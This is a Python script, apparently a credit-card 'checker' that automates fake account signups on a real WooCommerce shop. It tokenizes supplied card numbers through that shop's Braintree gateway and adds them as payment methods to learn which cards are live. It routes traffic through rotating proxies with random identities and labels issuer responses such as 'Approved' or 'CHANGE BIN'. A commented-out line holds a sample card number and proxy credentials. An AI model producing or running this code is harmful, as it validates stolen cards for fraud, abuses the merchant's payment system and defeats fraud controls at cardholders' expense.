from bs4 import BeautifulSoup
import ssl
import certifi
import aiohttp
import asyncio
import platform
import names
import random_address
import random
import json
import base64

genaddr = random_address.real_random_address()
address = genaddr['address1']
try: 
    City = genaddr['city']
except KeyError:
    City = "FL"
State = genaddr['state']
Zip_Code = genaddr['postalCode']

if platform.system()=='Windows':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

async def BraintreeWoo(cc, proxyrand):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    timeout=20
    async with aiohttp.ClientSession(connector=conn) as session:
        splitter = cc.split('|')
        ccnum    = splitter[0]
        mes      = splitter[1]
        ano      = splitter[2]
        cvv      = splitter[3]

        max_retries = 3
        retry_delay = 1
        for retry in range(max_retries):
            try:
                #---------------------------------REQUEST NUMERO 1------------------------------#
                #---------------------------------REQUEST NUMERO 1------------------------------#        
                session.headers.update({
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                })
                try:
                    async with session.get(url='https://www.gud-shop.com/my-account/', proxy=str(proxyrand), timeout=timeout) as resp:          
                        response = await resp.text()
                        woo_regi = (BeautifulSoup(response , 'lxml')).find_all("input", {"name": "woocommerce-register-nonce"})[0]["value"]
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 01. It was not generated correctly [UnboundLocalError]. ♻️'  
                except TypeError :
                    return 'An unexpected error occurred in request 01. It was not generated correctly [TypeError]. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 01. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 2------------------------------#
                #---------------------------------REQUEST NUMERO 2------------------------------#
                CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000,9999999)}@gmail.com"
                try :
                    data = {
                        #'username': f"{names.get_first_name()}{names.get_last_name()}{random.randint(10000,999999)}",
                        'email': CorreoRand,
                        'password': 'NqdvenVMc6MTBF7',
                        'woocommerce-register-nonce': woo_regi,
                        '_wp_http_referer': '/my-account/',
                        'register': 'Register',
                    }
                    async with session.post('https://www.gud-shop.com/my-account/', data=data, proxy=str(proxyrand), timeout=timeout) as resp:       
                        response = await resp.text()
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 02. It was not generated correctly [TypeError]. ♻️'
                except TypeError :
                    return 'An unexpected error occurred in request 02. It was not generated correctly [TypeError]. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 02. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 3------------------------------#
                #---------------------------------REQUEST NUMERO 3------------------------------#
                try :
                    async with session.get('https://www.gud-shop.com/my-account/edit-address/billing', proxy=str(proxyrand), timeout=timeout) as resp:
                        response = await resp.text()
                        woo_addr = (BeautifulSoup(response , 'lxml')).find("input", {"name": "woocommerce-edit-address-nonce"})["value"]
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 03. It was not generated correctly [UnboundLocalError]. ♻️'  
                except TypeError :
                    return 'An unexpected error occurred in request 03. It was not generated correctly [TypeError]. ♻️' 
                except KeyError :
                    return 'An unexpected error occurred in request 03. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"

                #---------------------------------REQUEST NUMERO 4------------------------------#
                #---------------------------------REQUEST NUMERO 4------------------------------#
                try :  
                    data = {
                        'billing_first_name': names.get_first_name(),
                        'billing_last_name': names.get_last_name(),
                        'billing_company': '',
                        'billing_country': 'US',
                        'billing_address_1': address,
                        'billing_address_2': '',
                        'billing_city': City,
                        'billing_state': State,
                        'billing_postcode': Zip_Code,
                        'billing_phone': F'7{random.randint(100,999)}{random.randint(100,999)}{random.randint(100,999)}',
                        'billing_email': CorreoRand,
                        'save_address': 'Save address',
                        'woocommerce-edit-address-nonce': woo_addr,
                        '_wp_http_referer': '/my-account/edit-address/billing',
                        'action': 'edit_address',
                    }
                    async with session.post('https://www.gud-shop.com/my-account/edit-address/billing', data=data, proxy=str(proxyrand), timeout=timeout) as resp:
                        response = await resp.text()
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 04. It was not generated correctly [UnboundLocalError]. ♻️'  
                except TypeError :
                    return 'An unexpected error occurred in request 04. It was not generated correctly [TypeError]. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 04. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientPayloadError :
                    return 'An unexpected error occurred in request 04. It was not generated correctly [ClientPayloadError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 5------------------------------#
                #---------------------------------REQUEST NUMERO 5------------------------------#
                try:
                    async with session.get('https://www.gud-shop.com/my-account/add-payment-method/', proxy=str(proxyrand), timeout=timeout) as resp:
                        response = await resp.text()
                        noncewoo2 = (BeautifulSoup(response , 'lxml')).find("input", {"name": "woocommerce-add-payment-method-nonce"})["value"]    
                        bearer = (response.split('"credit_card","client_token_nonce":"')[1]).split('","')[0]
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 05. It was not generated correctly [UnboundLocalError]. ♻️'   
                except TypeError :
                    return 'An unexpected error occurred in request 05. It was not generated correctly [TypeError]. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 05. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3" 
                #---------------------------------REQUEST NUMERO 6------------------------------#
                #---------------------------------REQUEST NUMERO 6------------------------------#
                try:
                    data = {
                        'action': 'wc_braintree_credit_card_get_client_token',
                        'nonce': bearer,
                    }
                    async with session.post('https://www.gud-shop.com/wp-admin/admin-ajax.php', data=data, proxy=str(proxyrand), timeout=timeout) as resp:
                        response = await resp.json()
                        bearer = json.loads(base64.b64decode(response['data']))
                        bearer = bearer['authorizationFingerprint']
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 06. It was not generated correctly [UnboundLocalError]. ♻️'   
                except KeyError :
                    return 'An unexpected error occurred in request 06. It was not generated correctly [KeyError]. ♻️'
                except TypeError :
                    return 'An unexpected error occurred in request 06. It was not generated correctly [TypeError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"    
                #---------------------------------REQUEST NUMERO 7------------------------------#
                #---------------------------------REQUEST NUMERO 7------------------------------#
                try:
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
                        'Accept': '*/*',
                        'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                        'Content-Type': 'application/json',
                        'Authorization': f'Bearer {bearer}',
                        'Braintree-Version': '2018-05-10',
                        'Origin': 'https://assets.braintreegateway.com',
                        'Connection': 'keep-alive',
                        'Referer': 'https://assets.braintreegateway.com/',
                    }
                    data = {
                        "clientSdkMetadata":{
                            "source":"client",
                            "integration":"custom",
                            "sessionId":"91982e2f-2643-4269-a871-72f01cc6c30d",
                        },
                        "query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
                        "variables":{
                            "input":{
                                "creditCard":{
                                    "number": ccnum,
                                    "expirationMonth": mes,
                                    "expirationYear": ano,
                                    "cvv": cvv
                                },
                                "options":{
                                    "validate": False
                                }
                            }
                        },
                        "operationName":"TokenizeCreditCard"
                    }
                    async with session.post('https://payments.braintree-api.com/graphql', headers=headers, proxy=str(proxyrand), json=data, timeout=timeout) as resp:       
                        token = await resp.json()
                        token = token['data']['tokenizeCreditCard']['token'] 
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 07. It was not generated correctly [UnboundLocalError]. ♻️'   
                except KeyError :
                    return 'An unexpected error occurred in request 07. It was not generated correctly [KeyError]. ♻️'
                except TypeError :
                    return 'An unexpected error occurred in request 07. It was not generated correctly [TypeError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"   
                #---------------------------------REQUEST NUMERO 8------------------------------#
                #---------------------------------REQUEST NUMERO 8------------------------------#
                try:
                    data = [
                        ('payment_method', 'braintree_credit_card'),
                        ('wc-braintree-credit-card-card-type', 'visa'),
                        ('wc-braintree-credit-card-3d-secure-enabled', ''),
                        ('wc-braintree-credit-card-3d-secure-verified', ''),
                        ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
                        ('wc_braintree_credit_card_payment_nonce', token),
                        ('wc_braintree_device_data', '{"correlation_id":""}'),
                        ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
                        ('wc_braintree_paypal_payment_nonce', ''),
                        ('wc_braintree_device_data', '{"correlation_id":""}'),
                        ('wc_braintree_paypal_amount', '0.00'),
                        ('wc_braintree_paypal_currency', 'USD'),
                        ('wc_braintree_paypal_locale', 'en_us'),
                        ('wc-braintree-paypal-tokenize-payment-method', 'true'),
                        ('woocommerce-add-payment-method-nonce', noncewoo2),
                        ('_wp_http_referer', '/my-account/add-payment-method/'),
                        ('woocommerce_add_payment_method', '1'),
                    ]
                    async with session.post('https://www.gud-shop.com/my-account/add-payment-method/', data=data, proxy=str(proxyrand), timeout=timeout) as resp:
                        response = await resp.text()
                except UnboundLocalError as e:
                    return 'An unexpected error occurred in request 08. It was not generated correctly [KeyError]. ♻️'   
                except KeyError :
                    return 'An unexpected error occurred in request 08. It was not generated correctly [KeyError]. ♻️'
                except TypeError :
                    return 'An unexpected error occurred in request 08. It was not generated correctly [TypeError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"  
                #------------ ---------------------CHECCK REQUESTS------------------------------#
                if int(response.find('New payment method added')) > 0 :
                    await session.close()
                    return "Approved", "1000 Approved"
                elif int(response.find('Status code 1000: Approved')) > 0 :
                    for i in response.split("\n"):
                        if 'Status code ' in i:
                            Message = i.replace(f'\t\t\t\tStatus code ',"").replace(": "," ").replace("\t\t\t</div>","")
                    return "Approved", Message
                elif int(response.find('Status code 2001: Insufficient Funds')) > 0 :
                    for i in response.split("\n"):
                        if 'Status code ' in i:
                            Message = i.replace(f'\t\t\t\tStatus code ',"").replace(": "," ").replace("\t\t\t</div>","")
                    await session.close()
                    return "Approved", Message
                elif (int(response.find('Status code cvv:')) > 0):
                    await session.close()
                    return "Approved", "Gateway Rejected: cvv"
                elif (int(response.find('Status code avs: Gateway Rejected: avs')) > 0):
                    await session.close()
                    return "Approved", "Gateway Rejected: avs"
                elif (int(response.find('Status code avs_and_cvv:')) > 0):
                    await session.close()
                    return "Approved", "Gateway Rejected: avs and cvv"
                elif int(response.find('Status code 2010: Card Issuer Declined CVV')) > 0 :
                    for i in response.split("\n"):
                        if 'Status code ' in i:
                            Message = i.replace(f'\t\t\t\tStatus code ',"").replace(": "," ").replace("\t\t\t</div>","")
                    return "Approved", Message
                elif int(response.find('Status code risk_threshold:')) > 0 :
                    await session.close()
                    return "Gateway Rejected: CHANGE BIN"
                elif int(response.find('Gateway Rejected: fraud')) > 0 :
                    await session.close()
                    return "Gateway Rejected: FRAUD"
                elif int(response.find('Processor Network Unavailable')) > 0 :
                    await session.close()
                    return "Processor Network Unavailable - Try Again"
                elif int(response.find('Duplicate card exists in the vault.')) > 0 :
                    await session.close()
                    return "This card is already registered"
                elif int(response.find('Status code')) > 0 :
                    for i in response.split("\n"):
                        if 'Status code ' in i:
                            Message = i.replace(f'\t\t\t\tStatus code ',"").replace(": "," ").replace("\t\t\t</div>","")
                    return Message
                else :
                    return "An unexpected error occurred in response. It was not generated correctly. ⚠️"
            except (aiohttp.client_exceptions.ServerDisconnectedError):
                return "An unexpected error occurred. ServerDisconnectedError. ♻️"
            except (asyncio.exceptions.TimeoutError):
                return "An unexpected error occurred. Timeout Error. ♻️"
            except (aiohttp.client_exceptions.ClientConnectorError):
                return "An unexpected error occurred. ClientConnectorError. ♻️"
            finally:
                 await session.close()

#print(asyncio.run(BraintreeWoo("4931096582144212|03|2027|261", "http://zzjuudfj-20-rotate:27iql24j8552@p.webshare.io:80/")))